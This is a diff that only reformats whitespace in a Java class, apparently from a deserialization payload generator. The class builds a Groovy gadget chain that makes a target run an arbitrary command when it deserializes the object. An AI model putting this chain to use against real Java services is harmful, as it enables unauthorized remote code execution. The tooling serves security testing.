@@ -28,8 +28,8 @@ import java.util.Map;
 public class Groovy1 implements ObjectPayload<InvocationHandler> {
 
     public InvocationHandler getObject(String command) throws Exception {
-        final ConvertedClosure  closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");
-        final Map               map     = Gadgets.createProxy(closure, Map.class);
+        final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");
+        final Map map = Gadgets.createProxy(closure, Map.class);
         final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(map);
         return handler;
     }
